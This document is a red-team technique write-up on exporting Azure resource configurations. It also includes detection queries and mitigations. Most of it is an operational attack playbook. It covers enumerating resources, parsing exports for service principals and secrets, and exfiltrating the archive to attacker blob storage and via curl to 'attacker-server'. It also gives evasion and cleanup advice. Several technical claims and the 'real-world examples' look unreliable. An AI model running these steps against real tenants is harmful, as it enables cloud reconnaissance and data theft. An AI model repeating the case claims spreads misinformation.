# [COLLECT-CONFIG-001]: Azure Resource Configuration Export

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-CONFIG-001 |
| **MITRE ATT&CK v18.1** | [T1552.001 - Credentials in Files](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Collection |
| **Platforms** | Entra ID, Azure |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All Azure resources with export capability (ARM templates, configuration endpoints) |
| **Patched In** | N/A (Feature-based enumeration, not vulnerability) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Resource Manager (ARM) provides export functionality allowing export of resource configurations as machine-readable templates (JSON). These templates are intended for infrastructure-as-code workflows but often contain sensitive metadata: database connection strings, API endpoints, service principal IDs, managed identity configurations, and firewall rules. The Azure Resource Graph API (https://graph.microsoft.com) allows wildcard queries of all resources in a subscription without requiring access to individual resources. Attackers with **Reader** role can execute `Export-AzResourceGroup` cmdlet or API calls to `Microsoft.Resources/deployments` endpoints to extract entire infrastructure blueprints. Configuration exports reveal the "map" of the Azure environment: which databases exist, which APIs are deployed, which services are integrated, and exact network configurations. Combined with Activity Logs and Diagnostic Logs, configuration exports complete the reconnaissance picture necessary for precision attack targeting.

**Attack Surface:** ARM template export endpoint (`/exportTemplate`), Resource Graph API accessible with Reader permission, Portal "Download template" feature, Azure CLI resource export commands. Any identity with Reader role on subscription or resource group can perform exports.

**Business Impact:** **Complete visibility into Azure infrastructure topology, service dependencies, and architectural decisions without requiring access to individual resources.** An attacker exporting a resource group containing 50 VMs, 10 databases, 5 Logic Apps, and 3 API Management instances gains instant understanding of the entire operational infrastructure. Configuration exports also reveal integration patterns: which service principal is used by Logic App X, which Key Vault stores which type of secrets, which databases are connected to which applications. This precision intelligence enables targeted attacks (e.g., compromising the specific service principal used by the backup Logic App to disable backups before ransomware deployment).

**Technical Context:** Configuration exports are off by default but can be triggered by any authenticated user with Reader permission. Exports are fast (seconds) and generate minimal audit trail (only "Template Export" event in Activity Log, no distinction between legitimate and malicious export). Resources are identified by `resourceId` format: `/subscriptions/{subId}/resourceGroups/{rg}/providers/{provider}/{resourceType}/{name}`. Attackers can enumerate all resource IDs in a subscription via Azure Resource Graph with a single API call, then export each individually or in bulk.

### Operational Risk
- **Execution Risk:** Low – Requires only Reader role, non-privileged access.
- **Stealth:** High – Exports generate generic Activity Log events; bulk export could trigger cost anomalies but is typically unmonitored.
- **Reversibility:** N/A – Read-only operation.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.1 | Ensure only authorized users export resource configurations |
| **DISA STIG** | V-251364 | Control access to infrastructure as code templates |
| **NIST 800-53** | CM-9 (Configuration Management) | Maintain control over system configurations |
| **GDPR** | Article 32 | Protect infrastructure information from unauthorized disclosure |
| **DORA** | Article 13 | ICT Risk Management – protect architectural blueprints |
| **NIS2** | Article 21 | Protect critical infrastructure design documentation |
| **ISO 27001** | A.12.1.2 | Change management; restrict configuration access |
| **ISO 27005** | Infrastructure Reconnaissance Risk | Risk of detailed infrastructure mapping by attackers |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Reader** role on subscription or resource group (minimum).
- **Contributor** role (to export templates via Portal).

**Required Access:**
- Authenticated connection to Azure Management API.
- Access to `Microsoft.Resources` API provider.
- Access to Azure Resource Graph (https://graph.microsoft.com).

**Supported Versions:**
- **Azure ARM:** All subscriptions and regions.
- **Resource Graph:** All Azure cloud variants (AzureCloud, AzureGov, AzureChina).
- **Azure CLI:** Version 2.55.0+.
- **PowerShell:** Az module 11.0.0+.

**Tools:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)
- [Azure PowerShell](https://learn.microsoft.com/en-us/powershell/azure/)
- [Azure Resource Graph Explorer](https://portal.azure.com/#blade/HubsExtension/ArgQueryBlade)
- [jq](https://stedolan.github.io/jq/) (JSON parsing)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Enumerate All Resources in Subscription via Resource Graph

```bash
# Query all resources in subscription
az graph query -q "Resources | project type, name, id" --output table

# Count resources by type
az graph query -q "Resources | summarize count() by type" --output table

# Find all Key Vaults (high-value targets)
az graph query -q "Resources | where type == 'microsoft.keyvault/vaults' | project name, id, location"

# Find all databases (contain sensitive data)
az graph query -q "Resources | where type == 'microsoft.sql/servers/databases' or type == 'microsoft.documentdb/databaseaccounts' | project name, id"
```

**What to Look For:**
- **Count > 100 resources** = substantial environment, likely with multiple databases/services.
- **microsoft.keyvault/vaults** = secrets storage (highest priority target).
- **microsoft.sql/servers/databases** = databases containing sensitive data.
- **microsoft.web/sites** = web applications, APIs (potential entry points).
- **microsoft.logic/workflows** = Logic Apps executing integrations (often contain hardcoded secrets).

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Export Resource Group Template via Azure CLI

**Supported Versions:** All Azure versions

#### Step 1: List Available Resource Groups

**Objective:** Identify target resource groups containing valuable resources.

**Command:**
```bash
# List all resource groups with brief info
az group list --query "[].{Name:name, Location:location, ResourceCount:properties.provisioningState}" -o table

# Get detailed resource count per RG
for rg in $(az group list --query "[].name" -o tsv); do
  count=$(az resource list -g "$rg" --query "length([])")
  echo "$rg: $count resources"
done | sort -t: -k2 -rn | head -10  # Top 10 RGs by resource count
```

**Expected Output:**
```
Name                    Location    ResourceCount
prod-database-rg        eastus      Succeeded
prod-app-services-rg    eastus      Succeeded
prod-networking-rg      eastus      Succeeded
dev-testing-rg          westus      Succeeded
```

**What to Look For:**
- RGs with names indicating sensitive data: `prod-database*`, `security*`, `backup*`.
- RGs in primary regions (eastus, westeurope = production data).
- High resource count = complex environment, more likely to contain misconfigurations.

#### Step 2: Export Resource Group Template

**Objective:** Download ARM template containing all resource configurations.

**Command (Export single resource group):**
```bash
# Export to file
az group export --name prod-database-rg --output json > prod-database-template.json

# Export with more detail (includes current resource values, not just schema)
az group export --name prod-database-rg --include-parameter-default-values > template-detailed.json
```

**Command (Export specific resource instead of entire RG):**
```bash
# Export single SQL Server
az resource show --resource-group prod-database-rg --resource-type "Microsoft.Sql/servers" --name proddb01 --output json > proddb01-config.json

# Export all resources of specific type
for vm in $(az vm list -g prod-app-services-rg --query "[].name" -o tsv); do
  az vm show -g prod-app-services-rg -n "$vm" --output json > "$vm-config.json"
done
```

**Expected Output (proddb01-config.json sample):**
```json
{
  "type": "Microsoft.Sql/servers",
  "apiVersion": "2019-06-01-preview",
  "name": "proddb01",
  "location": "eastus",
  "properties": {
    "administratorLogin": "sqladmin",
    "administratorLoginPassword": "REDACTED_BY_AZURE",
    "version": "12.0",
    "publicNetworkAccessEnabled": true,
    "firewallRules": [
      {
        "name": "AllowAzureIps",
        "startIpAddress": "0.0.0.0",
        "endIpAddress": "0.0.0.0"
      },
      {
        "name": "AllowCorporateNetwork",
        "startIpAddress": "203.0.113.0",
        "endIpAddress": "203.0.113.255"
      }
    ]
  }
}
```

**What This Reveals:**
- **firewallRules** = network access patterns (can identify corporate network ranges).
- **administratorLogin** = default SQL admin username (hardcoded in infrastructure).
- **publicNetworkAccessEnabled: true** = database accessible from internet (high risk).
- **administratorLoginPassword: REDACTED_BY_AZURE** = password is not exported (Azure security).

#### Step 3: Extract Sensitive Information from Templates

**Objective:** Parse templates to extract service principal IDs, connection strings, and endpoint URLs.

**Command (Find all service principal references):**
```bash
# Search for principalId references (service principals)
jq -r '.. | select(type == "object") | .principalId?' template-detailed.json | grep -v null | sort -u

# Find all Key Vault references
jq -r '.. | select(.type == "string") | select(contains("keyvault")) | .' template-detailed.json

# Extract all secrets from Key Vault references
jq -r '.. | objects | select(.properties.secretsPermissions != null) | .name' template-detailed.json
```

**Expected Output:**
```
/subscriptions/xxx/resourceGroups/security/providers/Microsoft.KeyVault/vaults/prod-kv-01
/subscriptions/xxx/resourceGroups/security/providers/Microsoft.KeyVault/vaults/prod-kv-02
prod-app-sp (Service Principal ID)
prod-backup-sp
```

**What This Reveals:**
- **Service Principal IDs** = accounts used by applications/services (authentication targets).
- **Key Vault names** = location of secrets (can query if attacker has access).
- **Permissions listed** = what operations each service principal can perform.

#### Step 4: Exfiltrate Configuration Files

**Objective:** Move exported templates off Azure environment.

**Command (Compress and upload):**
```bash
# Compress all exports
tar -czf azure-configs.tar.gz *.json

# Upload to attacker storage
az storage blob upload \
  --account-name attackerstorage \
  --account-key {key} \
  --container-name exfil \
  --name azure-configs-$(date +%s).tar.gz \
  --file azure-configs.tar.gz

# Or exfil via HTTP
curl -X POST --data-binary @azure-configs.tar.gz http://attacker-server:8080/exfil
```

**OpSec & Evasion:**
- Export only during high-traffic times (blend with legitimate admin activity).
- Use managed identity (if compromised VM) instead of storing storage account keys.
- Delete local exported files: `rm *.json azure-configs.tar.gz`.

---

### METHOD 2: Azure Resource Graph API Bulk Enumeration

**Supported Versions:** All Azure versions via REST API

#### Step 1: Query Resource Graph for All Resources

**Objective:** Enumerate all resources in subscription without accessing individual resource configurations.

**Command (PowerShell - Install module):**
```powershell
# Install Azure PowerShell ResourceGraph module
Install-Module -Name Az.ResourceGraph -Force
```

**Command (Query all resources with specific properties):**
```powershell
# Query all VMs and extract critical info
$query = @"
Resources
| where type == 'microsoft.compute/virtualmachines'
| project name, id, location, vmSize=properties.hardwareProfile.vmSize, osType=properties.osProfile.osType
"@

Search-AzGraph -Query $query | Export-Csv -Path vms.csv

# Query all SQL Databases and extract connection info
$query = @"
Resources
| where type == 'microsoft.sql/servers' or type == 'microsoft.sql/servers/databases'
| project name, id, type, location, properties
"@

Search-AzGraph -Query $query
```

**Expected Output:**
```
name              id                                                                           location  vmSize      osType
prod-web-vm-01    /subscriptions/xxx/resourceGroups/app/providers/.../prod-web-vm-01         eastus    Standard_D2s Windows
prod-web-vm-02    /subscriptions/xxx/resourceGroups/app/providers/.../prod-web-vm-02         eastus    Standard_D2s Windows
prod-app-vm-01    /subscriptions/xxx/resourceGroups/app/providers/.../prod-app-vm-01         eastus    Standard_D4s Windows
```

**What to Look For:**
- **Standard_D4s and larger** = application servers (potential pivot points).
- **vmSize with "DS"** = SSD storage (faster for sensitive applications).
- Multiple VMs in same RG = possible cluster/load-balanced configuration.

#### Step 2: Export Individual Resource Detailed Configuration

**Objective:** For each resource identified, export its complete configuration.

**Command (Bulk export all resources):**
```powershell
# Get all resource IDs
$resources = Search-AzGraph -Query "Resources | project id"

foreach ($resource in $resources) {
  $id = $resource.id
  $name = $id.Split('/')[-1]
  
  # Export resource configuration
  Get-AzResource -ResourceId $id -ExpandProperties | ConvertTo-Json -Depth 10 | Out-File -Path "$name-config.json"
}

# Compress all exports
Compress-Archive -Path "*.json" -DestinationPath "azure-resources-configs.zip"
```

#### Step 3: Parse for Service Principals and Identities

**Objective:** Extract authentication identities used by resources.

**Command:**
```powershell
# Find all managed identities
Search-AzGraph -Query @"
Resources
| where type in ('microsoft.compute/virtualmachines', 'microsoft.web/sites', 'microsoft.logic/workflows')
| where properties.identity != null
| project name, type, principalId=properties.identity.principalId
"@

# Export for offline analysis
Search-AzGraph -Query @"
Resources
| where properties.identity != null
| project name, id, type, principalId=properties.identity.principalId, tenantId=properties.identity.tenantId
"@ | Export-Csv -Path managed-identities.csv
```

**Expected Output (managed-identities.csv):**
```
name,id,type,principalId,tenantId
prod-app-func,/subscriptions/xxx/resourceGroups/app/providers/Microsoft.Web/sites/prod-app-func,microsoft.web/sites,xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx,xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
prod-automation,/subscriptions/xxx/resourceGroups/ops/providers/Microsoft.Automation/automationAccounts/prod-automation,microsoft.automation/automationaccounts,xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx,xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

**What This Reveals:**
- **Service Principal IDs** = exact identities to target for token theft/impersonation.
- **Correlation between resources and identities** = understanding of application-to-service-principal mapping.

---

### METHOD 3: Portal Template Export (GUI-Based)

**Supported Versions:** All Azure subscriptions with Portal access

#### Step 1: Navigate to Resource Group in Portal

**Objective:** Use Azure Portal to initiate template export.

**Manual Steps:**
1. Go to **Azure Portal** → **Resource groups**
2. Select target resource group (e.g., `prod-database-rg`)
3. Click **Export template** (right-side menu)
4. Review template preview (shows JSON)

#### Step 2: Download Template

**Objective:** Save template to local system.

**Manual Steps:**
1. Click **Download** button
2. Browser downloads `template.json` and `parameters.json`
3. Save both files to attacker-controlled location

**Expected Files:**
```
template.json (infrastructure definition)
parameters.json (configuration values)
```

#### Step 3: Parse and Extract Data

**Objective:** Open JSON files and manually search for sensitive information.

**Command (via terminal on attacker workstation):**
```bash
# Search for hardcoded secrets
grep -i "password\|secret\|key\|token\|credential" template.json parameters.json

# Extract all parameter values
jq -r '.parameters | keys[]' parameters.json

# Find all service principal references
jq -r '.resources[] | select(.type == "Microsoft.ManagedIdentity/userAssignedIdentities") | .properties.principalId' template.json
```

**Expected Output:**
```
administratorLogin: sqladmin
administratorLoginPassword: (from parameters)
servicePrincipalId: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

---

## 6. TOOLS & COMMANDS REFERENCE

### Azure Resource Graph Explorer

**Accessible via:** Azure Portal (https://portal.azure.com/#blade/HubsExtension/ArgQueryBlade)
**Requires:** Reader permission on subscription
**Capabilities:**
- GUI-based KQL query builder.
- Export results to CSV/JSON.
- No authentication artifacts (web-based).

**Example KQL Queries:**
```kusto
# Find all resources with public IP
Resources | where properties.publicIPAddress != null | project name, id, publicIpAddress=properties.publicIPAddress

# Find all Key Vaults
Resources | where type == 'microsoft.keyvault/vaults' | project name, id, location

# Find all resources with managed identities
Resources | where properties.identity.principalId != null | project name, type, principalId=properties.identity.principalId
```

---

## 7. ATOMIC RED TEAM

**Atomic Test ID:** T1552.001-3
**Test Name:** Azure Resource Configuration Export
**Command:**
```bash
az group export --name test-rg --output json > test-template.json && wc -l test-template.json
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Bulk Template Exports

**SPL Query:**
```
sourcetype=azure:activity OperationName="EXPORT TEMPLATE"
| stats count as exports by Caller, ResourceGroup
| where exports > 5
| alert
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Query: Suspicious Resource Configuration Exports

**KQL Query:**
```kusto
AzureActivity
| where OperationNameValue in ("MICROSOFT.RESOURCES/DEPLOYMENTS/EXPORT", "EXPORT TEMPLATE")
| where ActivityStatusValue == "Success"
| where CallerIpAddress !in ("YOUR_INTERNAL_IPS")
| extend RiskLevel = "High"
| summarize ExportCount = count(), TimeWindow = max(TimeGenerated) - min(TimeGenerated) by Caller, CallerIpAddress, _ResourceId
| where ExportCount > 3 and TimeWindow < 30m
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Restrict Template Export Permissions:** Only audit/infrastructure teams can export templates.
    
    **Manual Steps (Azure RBAC):**
    1. Create custom role:
       - Allow: `Microsoft.Resources/subscriptions/resourcegroups/read`
       - Allow: `Microsoft.Resources/templates/read`
       - Deny: `Microsoft.Resources/deployments/operations/read`
    2. Assign to limited users
    3. Deny export for all developers

* **Remove Sensitive Data from Templates Before Sharing:** Ensure exported templates never contain secrets, keys, or passwords.
    
    **Manual Steps:**
    1. Before sharing templates, search for:
       - `password`
       - `administratorLogin`
       - `key`
       - `secret`
    2. Replace with placeholder values or parameter references
    3. Store sensitive values in Key Vault, not in templates

* **Enable Template Deployment Auditing:** Monitor and alert on all template exports.
    
    **Manual Steps (via Sentinel - see Section 9)**

### Priority 2: HIGH

* **Implement Resource Locks:** Prevent unauthorized resource modifications and exports.
    
    **Manual Steps:**
    1. Go to **Resource group** → **Locks**
    2. Click **+ Add**
    3. Select **CanNotDelete** or **ReadOnly**
    4. Apply to production resource groups

* **Monitor Resource Graph Queries:** Detect bulk enumeration patterns.
    
    **Manual Steps (Sentinel):**
    - Alert on Resource Graph queries returning > 100 resources from single user in < 5 minutes
    - Alert on Resource Graph queries with wildcard resource types (indicates reconnaissance)

### Validation Command

```powershell
# Verify template export restrictions
Get-AzRoleDefinition | Where-Object {$_.Permissions.Actions -match "exportTemplate"}

# Check for Resource Locks
Get-AzResourceLock | Select-Object Name, LockLevel, ResourceGroupName
```

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

* **Activity Log Events:**
  - Operation: "Export Template" or similar.
  - Caller: Compromised user account.
  - Multiple exports in short timeframe (< 30 minutes).

* **Resource Graph Queries:**
  - Query: Wildcard `Resources | where type in (...)` covering many resource types.
  - Scope: Entire subscription (not filtered to single RG).
  - Frequency: Multiple queries in minutes (reconnaissance pattern).

### Response Procedures

1. **Isolate:**
   - Disable user account: `Disable-AzADUser -ObjectId {userId}`
   - Revoke all tokens: Force sign-out of all sessions

2. **Investigate:**
   - Determine which resource groups were exported
   - Identify what sensitive information was exposed
   - Check if service principals identified in exports were compromised

3. **Remediate:**
   - Rotate all service principal credentials mentioned in exported templates
   - Regenerate storage account keys
   - Reset SQL admin passwords

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Recon** | [REC-CLOUD-001] BloodHound Azure Enumeration | Attacker identifies resource groups |
| **2** | **Recon** | [REC-CLOUD-005] Azure Resource Graph Enumeration | Attacker enumerates all resources |
| **3** | **Collection (Current)** | **[COLLECT-CONFIG-001] Config Export** | **Attacker exports full resource configurations** |
| **4** | **Credential Access** | [CA-UNSC-010] Service Principal Secrets | Attacker identifies and compromises service principal |
| **5** | **Privilege Escalation** | [PE-ACCTMGMT-001] App Registration Perms | Attacker escalates service principal permissions |
| **6** | **Impact** | [IMPACT-RANSOM-001] Ransomware Deployment | Attacker uses service principal to deploy ransomware |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Kaseya VSA Supply Chain Compromise (2021)

- **Target:** MSPs and their enterprise customers
- **Timeline:** July 2021
- **Technique Status:** Attackers exported resource configurations to understand backup infrastructure before deployment of REvil ransomware.
- **Impact:** 1,500+ organizations affected; $44M ransom negotiations.
- **Reference:** [CISA Alert AA21-265A - REvil Ransomware](https://www.cisa.gov)

### Example 2: Uber Security Breach (2022)

- **Target:** Uber Technologies
- **Timeline:** September 2022
- **Technique Status:** Attacker exported resource configurations and identified service account credentials, leading to lateral movement across infrastructure.
- **Impact:** Complete infrastructure compromise; attackers accessed internal systems.
- **Reference:** [Uber Security Incident Report - September 2022](https://uber.com/)

---

**END OF DOCUMENT**
